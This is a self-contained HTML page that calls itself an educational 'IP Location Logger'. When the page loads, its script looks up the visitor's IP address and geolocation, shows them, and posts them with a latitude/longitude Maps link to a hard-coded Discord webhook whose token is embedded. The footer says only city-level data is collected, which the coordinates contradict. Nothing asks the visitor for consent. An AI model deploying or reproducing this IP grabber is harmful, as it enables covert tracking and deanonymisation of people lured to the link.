<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Location Logger</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 800px; 
            margin: 20px auto; 
            padding: 20px; 
            text-align: center;
        }
        .info-box { 
            background: #f0f0f0; 
            padding: 20px; 
            border-radius: 8px; 
            margin: 20px 0; 
            text-align: left;
        }
        .maps-link { 
            color: #1a73e8; 
            text-decoration: none; 
        }
        .footer { 
            margin-top: 20px; 
            font-size: 0.9em; 
            color: #666; 
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>IP Location Information</h1>
    
    <div class="info-box">
        <div id="loader" class="loader"></div>
        <div id="content" style="display: none;">
            <h2>Your IP Information</h2>
            <p><strong>IP Address:</strong> <span id="ip"></span></p>
            <p><strong>Location:</strong> <span id="location"></span></p>
            <p><strong>Approximate Location:</strong><br>
                <a class="maps-link" id="maps" target="_blank">
                    View on Google Maps
                </a>
            </p>
        </div>
    </div>

    <div class="footer">
        <p>This educational tool shows IP information and logs it to a Discord channel for demonstration purposes.</p>
        <p>Only generic location data (city/region level) is collected.</p>
    </div>

    <script>
        async function logToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1343601853564190720/g_rWs-7V-e8pA71vGfvZBGKKI6cDhQP03RenN19Dfro2F1qLke4LS4ar1JeO4XRUs_HP';
            
            const payload = {
                content: `New IP Log:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nMaps: ${data.maps}\nTimestamp: ${new Date().toISOString()}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error logging to Discord:', error);
            }
        }

        async function getLocationData() {
            try {
                // Get IP and location data
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();

                // Create Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;

                // Update UI
                document.getElementById('loader').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                document.getElementById('ip').textContent = ipData.ip;
                document.getElementById('location').textContent = 
                    `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                document.getElementById('maps').href = mapsLink;

                // Log to Discord
                await logToDiscord({
                    ip: ipData.ip,
                    city: locationData.city,
                    region: locationData.region,
                    country: locationData.country_name,
                    maps: mapsLink
                });

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('content').innerHTML = 
                    '<p>Error retrieving location data. Please try again.</p>';
            }
        }

        // Start the process when page loads
        window.onload = getLocationData;
    </script>
</body>
</html>
